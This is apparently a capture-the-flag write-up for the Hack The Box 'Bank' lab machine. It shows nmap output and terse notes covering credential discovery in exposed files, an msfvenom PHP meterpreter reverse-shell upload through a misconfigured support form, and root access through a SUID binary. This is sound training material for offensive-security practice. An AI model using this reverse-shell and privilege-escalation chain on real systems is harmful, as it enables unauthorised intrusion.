# Recon
```
$ nmap -sC -sV 10.10.10.29
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-02 08:38 EEST
Nmap scan report for 10.10.10.29
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08eed030d545e459db4d54a8dc5cef15 (DSA)
|   2048 b8e015482d0df0f17333b78164084a91 (RSA)
|   256 a04c94d17b6ea8fd07fe11eb88d51665 (ECDSA)
|_  256 2d794430c8bb5e8f07cf5b72efa16d67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.35 seconds

```
- The hostname must be guessed on this machine (bank.htb) add to hosts file
- feroxbuster with the lowercase medium wordlist, will find the balance-transfer 
- found some .acc file one of them seems small in size
- 68576f20e9732f1b2edc4df5b8533230.acc we open it using vscode and found some creds
- we also have alogin page we try the creds and we got in there are 2 pages we review the source code of each of them on the support page we found in the source code a line that says any .htb will be executed as .php
- Generate a reverse PHP shell with msfvenom -p php/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f raw > writeup.htb and upload it
using the form found in the support page
- open msfconsole set multi/handler ,set payload payload/php/meterpreter/reverse_tcp and exploit
- go to /uploads/**shell.htb**
- and we got shell
# privilage escalation
- find / -type f -user root -perm -4000 2>/dev/null
- to search for all SUID binaries owned by root on the system
- the first one seems out of ordinary /var/htb/bin/emergency
- i just passed this in the shell and got root
```
/var/htb/bin/emergency
```
